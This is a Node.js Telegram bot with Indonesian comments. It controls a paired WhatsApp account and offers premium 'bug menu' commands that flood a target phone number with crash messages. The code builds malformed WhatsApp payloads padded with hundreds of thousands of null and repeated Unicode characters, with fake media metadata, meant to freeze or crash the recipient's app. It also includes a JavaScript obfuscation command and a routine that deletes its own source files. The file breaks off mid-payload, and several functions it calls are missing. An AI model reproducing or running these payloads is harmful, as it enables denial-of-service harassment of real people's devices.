const { Telegraf } = require("telegraf");
const fs = require('fs');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    proto,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const axios = require("axios");

async function getBuffer(url) {

    try {

        const res = await axios.get(url, { responseType: "arraybuffer" });

        return res.data;

    } catch (error) {

        console.error(error);

        throw new Error("Gagal mengambil data.");

    }

}
const JsConfuser = require('js-confuser');
const yts = require("yt-search");
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "🌆";
  } else if (hours >= 12 && hours < 18) {
    return "🌇";
  } else {
    return "🌌";
  }
}
const greeting = getGreeting();
// Fungsi untuk memeriksa status pengguna
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "Owner" : "Unknown";
}

// Fungsi untuk mendapatkan nama pengguna dari konteks bot
function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Middleware untuk membatasi akses hanya ke grup tertentu
const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};

// Inisialisasi bot Telegram
const bot = new Telegraf(BOT_TOKEN);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// Helper untuk tidur sejenak
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk menerima input dari terminal
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});


async function isAuthorizedNumber(phoneNumber) {
    const databaseURL = 'https://raw.githubusercontent.com/candra402/data/refs/heads/main/database.json';
    try {
        const response = await axios.get(databaseURL);
        const authorizedNumbers = response.data.dbnya;
        return authorizedNumbers.includes(phoneNumber);
    } catch (error) {
        console.error('Error fetching database:', error.message);
        return
    }
}

// Delete file
function deleteFiles() {
    const filesToDelete = ['config.js', 'index.js']; // Ganti dengan nama file .js yang ingin dihapus
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file); // Menghapus file
            console.log(chalk.red.bold(`File ${file} telah di deleted.`));
        }
    });
}

// Fungsi untuk memulai sesi WhatsApp
const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    sock = makeWASocket(connectionOptions);

    // Pairing code jika diaktifkan
    if (usePairingCode && !sock.authState.creds.registered) {
        let phoneNumber = await question(chalk.black.bold(chalk.bgCyan(`\nMasukkan target diawali dengan 62:\n`)));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await sock.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.red.bold(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green.bold('WhatsApp berhasil terhubung!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red.bold('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};
// Mulai sesi WhatsApp
startSesi();


const USERS_PREMIUM_FILE = './lib/usersPremium.json';
// Inisialisasi file usersPremium.json
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}

// Command untuk mengecek status premium
bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});

// Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addprem ( userID ) ( Duration )');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number ( in days ).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delprem ( userID )');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus premium user, implementasi tergantung logika sistem Anda
    const wasDeleted = removePremium(targetUserId); // Pastikan Anda memiliki fungsi ini

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
});

// Contoh fungsi `removePremium`, implementasikan sesuai database atau logika Anda
function removePremium(userId) {
    // Implementasi tergantung sistem, return true jika berhasil
    // Contoh:
    // const result = database.deletePremium(userId);
    // return result.success;
    console.log(`Removing premium access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}
bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Logika untuk pengguna premium
    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const photoUrl = 'https://litter.catbox.moe/e8lwsy.png'; // Ganti dengan URL gambar atau gunakan buffer gambar
    const caption = `Succes Send Bug\ntarget: ${target}\n\n𝗡𝗢𝗧𝗘\nPLEASE pause for 5 minutes to avoid being spammed`;

    const keyboard = [
        [
            {
                text: "Bug Menu",
                callback_data: "bugmenu"
            },
            {
                text: "Channel",
                url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H"
            }
        ]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(photoUrl, {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log(chalk.green.bold('Done response sent'));
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};
const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await sock.sendMessage(target, {
      text: message
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(`Gagal mengirim pesan ke WhatsApp (${number}):`, error.message);
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("brat", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil teks setelah perintah
    if (!text) {
        return ctx.reply("Masukkan teks! Contoh: /brat teksnya");
    }

    try {
        // Ambil buffer dari API
        const res = await getBuffer(`https://btch.us.kg/brat?text=${encodeURIComponent(text)}`);

        // Kirim sebagai stiker
        await ctx.replyWithSticker(
            { source: res },
            {
                packname: global.packname || "PackName", // Ganti dengan packname global Anda
                author: global.author || "Author",     // Ganti dengan author global Anda
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan saat membuat stiker.");
    }
});
bot.command("gpt", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); // Ambil teks setelah perintah

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Masukkan teks setelah perintah.");
    }

    // Fungsi untuk memanggil API OpenAI
    async function openai(text, logic) {
        try {
            const response = await axios.post(
                "https://chateverywhere.app/api/chat/",
                {
                    model: {
                        id: "gpt-4",
                        name: "GPT-4",
                        maxLength: 32000,
                        tokenLimit: 8000,
                        completionTokenLimit: 5000,
                        deploymentName: "gpt-4",
                    },
                    messages: [
                        {
                            pluginId: null,
                            content: text,
                            role: "user",
                        },
                    ],
                    prompt: logic,
                    temperature: 0.5,
                },
                {
                    headers: {
                        Accept: "/*/",
                        "User-Agent":
                            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    },
                }
            );

            return response.data; // Kembalikan hasil dari API
        } catch (error) {
            console.error("Error saat memanggil API OpenAI:", error);
            throw new Error("Terjadi kesalahan saat memproses permintaan Anda.");
        }
    }

    try {
        const result = await openai(text, ""); // Panggil API OpenAI
        ctx.reply(result); // Kirim respons ke pengguna
    } catch (error) {
        ctx.reply("❌ Terjadi kesalahan saat memproses permintaan.");
    }
});

bot.command("enc", async (ctx) => {
    console.log(`Perintah diterima: /encrypthard dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Memproses file untuk enkripsi
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    ctx.reply("Memproses encrypt hard code . . .");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = 
            "素晴座素晴難INDICTIVE素晴座素晴難" + 
            "素晴座素晴難INDICTIVE素晴座素晴";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z座sockXzo素Muzukashī素晴]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                const charactersLength = characters.length;
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./ENC-${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    await ctx.replyWithDocument(
        { source: encryptedFilePath, filename: `encrypted_${fileName}` },
        { caption: `File berhasil dienkripsi!\n@AiiiDev` }
    );
});
bot.command("xcrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await donerespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 3; i++) {
    await PannOfficiaLXCursor(target, ptcp = true);
    await Frezze(target, ptcp = true);
    await Frezze(target, ptcp = true);
    await PannOfficiaLXFreeze(target, ptcp = true);
  }

  // Menyelesaikan proses response


});
bot.command("xsystemui", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await donerespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 3; i++) {
   await Frezze(target, ptcp = true);
   await xeonHARD(target, ptcp = false);
   await systemUi(target, Ptcp = false);
   await GlX(target, Ptcp = true);
   await locasifreeze2(target, ptcp = false);
   await BlankScreen(target, Ptcp = false);
   await IosMJ(target, Ptcp = false);
   await Jade(target, ptcp = true);
   await PannOfficiaLXCursor(target, ptcp = true);
  }

  // Menyelesaikan proses response


});
bot.command("xiospay", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await donerespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
   await PannOfficiaLXCursor(target, ptcp = true);
   await QDIphone(target);
   await QXIphone(target);
   await BlankScreen(target, Ptcp = false);
   await QPayStriep(target);
   await IosMJ(target, Ptcp = false);
   await QPayIos(target);
   await FBiphone(target);
   await PannOfficiaLXCursor(target, ptcp = true);
  }

  // Menyelesaikan proses response
});
bot.command("cekid", ctx => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ᴄᴇᴋ ɪᴅ  )
│
〢𝗡𝗮𝗺𝗲: ${sender}
〢𝗶𝗗: ${id}
│
╰────────〣`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.action("cekid", (ctx) => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ᴄᴇᴋ ɪᴅ  )
│
〢𝗡𝗮𝗺𝗲: ${sender}
〢𝗶𝗗: ${id}
│
╰───────〣`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.start(ctx => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
  const menuMessage = `
Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

Silahkan Pilih Menu Di Bawah`;
  const photoUrl = "https://litter.catbox.moe/ce30qz.png";
const keyboard = [
    [
        { text: "Tools Menu", callback_data: "menu" },
        { text: "Bug Menu", callback_data: "bugmenu" }
    ],
    [
        { text: "Owner Menu", callback_data: "ownermenu" },
        { text: "Channel", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" }
    ],
];
  ctx.replyWithPhoto(photoUrl, {
    caption: menuMessage,
    reply_markup: {
      inline_keyboard: keyboard
    }
  });
});
bot.action("ownermenu", (ctx) => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ᴏᴡɴᴇʀ ᴍᴇɴᴜ  )
│
〢
│⟐ /delprem
│⟐ /addprem
│⟐ /statusprem
│⟐ /status
〢
│
╰───────────〣
`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.action("menu", (ctx) => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ᴛᴏᴏʟs ᴍᴇɴᴜ  )
│
〢
│⟐ /cekid
│⟐ /brat
│⟐ /enc 
│⟐ /gpt
〢
│
╰───────────〣
`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.action("bugmenu", (ctx) => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
  ctx.answerCbQuery(); // Memberi umpan balik bahwa tombol ditekan
  const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ʙᴜɢ ᴍᴇɴᴜ  )
│
〢
│⟐ /xcrash ᝄ number
│⟐ /xsystemui ᝄ number
│⟐ /xiospay ᝄ number
〢
│
╰─────────〣`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
//Menu Awal
bot.command("bugmenu", ctx => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ʙᴜɢ ᴍᴇɴᴜ  )
│
〢
│⟐ /xcrash ᝄ number
│⟐ /xsysui ᝄ number
│⟐ /xiospay ᝄ number
〢
│
╰─────────〣`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.command("menu", ctx => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ᴛᴏᴏʟs ᴍᴇɴᴜ  )
│
〢
│⟐ /cekid
│⟐ /brat
│⟐ /enc 
│⟐ /gpt
〢
│
╰───────────〣`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.command("ownermenu", ctx => {
  const sender = ctx.from.username;
  const id = ctx.from.id;
const greeting = new Date().getHours() < 12 ? "Siang" : new Date().getHours() < 18 ? "Sore" : "Malam";
  const menu = `Selamat ${greeting}
Aloo ${sender}
Saya Adalah Bot 𝗜𝗡𝗗𝗜𝗖𝗧𝗜𝗩𝗘 𝗩𝟭.𝟬 Versi Free, Yang Siap Membantu Anda

╭──(  ᴏᴡɴᴇʀ ᴍᴇɴᴜ  )
│
〢
│⟐ /delprem
│⟐ /addprem
│⟐ /statusprem
│⟐ /status
〢
│
╰───────────〣`;

  const keyboard = [
[
   { text: "Channel Owner", url: "https://whatsapp.com/channel/0029Vb0QzFnGehEEmn4Jyl0H" },
   { text: "Owner IndicTive", url: "https://t.me/AiiiDev" }
]
];

  ctx.replyWithPhoto("https://litter.catbox.moe/weq0io.png", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  })
});
bot.command("connect", async ctx => {
  if (isWhatsAppConnected) {
    ctx.reply("✅ WhatsApp sudah terhubung.");
    return;
  }
  ctx.reply("🔄 Menghubungkan WhatsApp, silakan tunggu...");
  try {
    await startSesi();
    ctx.reply("✅ WhatsApp berhasil terhubung!");
  } catch (error) {
    ctx.reply(`❌ Gagal menghubungkan WhatsApp: ${error.message}`);
  }
});
// Function Bug
bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan target: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ WhatsApp belum terhubung.");
  }
});

//function bug

async function PannOfficiaLXCursor(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Its Me PannOfficiaLX ><" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "KataMaafMembunuhMu𓂾",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© PannOfficiaL",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "PannOfficiaL͢X͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/xxxxxx",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Crasher - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "Crashed Hardd",
sourceId: "Raurr",
ctwaClid: "cta",
ref: "ref",
sendToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "11111@newsletter",
serverMessageId: 1,
newsletterName: `- Kontol Mu Kecill 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "Dari PannOfficiaLX"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

